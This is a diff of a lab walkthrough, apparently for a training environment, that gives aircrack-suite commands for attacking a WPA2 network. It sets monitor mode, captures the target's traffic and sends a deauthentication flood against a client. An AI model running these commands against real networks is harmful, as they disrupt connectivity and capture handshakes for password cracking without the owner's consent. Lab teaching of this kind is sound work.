@@ -6,10 +6,10 @@ Two attacker panes will appear in your terminal window.
 
 ![[Pasted image 20250121124517.png]]
 
-Within one of these panes, run the following command to put the a-wlan0 interface into monitor mode.
+Within one of these panes, run the following command to put the Attacker-wlan0 interface into monitor mode.
 
 ```
-airmon-ng start a-wlan0
+airmon-ng start Attacker-wlan0
 ```
 
 If the following prompt appears, input "y" and hit enter. 
@@ -23,27 +23,27 @@ Successful initialization will appear as pictured below.
 Check the new monitor interface. 
 
 ```
-ifconfig | grep flags
+iwconfig
 ```
 
-As pictured below, a-wlan0mon should now be present. 
+As pictured below, wlan0mon should now be present and in monitor mode.
 
 ![[Pasted image 20250121124744.png]]
 
 Next, run airodump-ng to identify the the BSSID for WPA2_NETWORK.
 
 ```
-airodump-ng a-wlan0mon
+airodump-ng wlan0mon
 ```
 
 The following should appear. Note the BSSID for the WPA2_NETWORK.
 
 ![[Pasted image 20250121124907.png]]
 
-After noting the BSSID for the WPA2_NETWORK, stop the process using \[CTRL + c]. Next, run aircrack-ng to begin generating a capture file. 
+After noting the BSSID for the WPA2_NETWORK, stop the process using \[CTRL + c]. Next, run airodump-ng to begin generating a capture file. 
 
 ```
-airodump-ng a-wlan0mon -c 6 --bssid <WPA2_BSSID> -w wificap1
+airodump-ng wlan0mon -c 6 --bssid <WPA2_BSSID> -w wificap1
 ```
 
 Running the above command will provide the following output. 
@@ -59,7 +59,7 @@ Take note of one of the station macs under the STATION column in the console out
 Run the following command in the other panel terminal. Replace \<WPA2_Network BSSID> and \<STATION MAC> with the WPA2_Network BSSID and any station mac respectively.
 
 ```
-aireplay-ng a-wlan0mon -0 100 -a <WPA2_Network BSSID> -c <STATION MAC>
+aireplay-ng wlan0mon -0 100 -a <WPA2_Network BSSID> -c <STATION MAC>
 ```
 
 After running this command, your terminal should be spammed with the messages pictured below. 
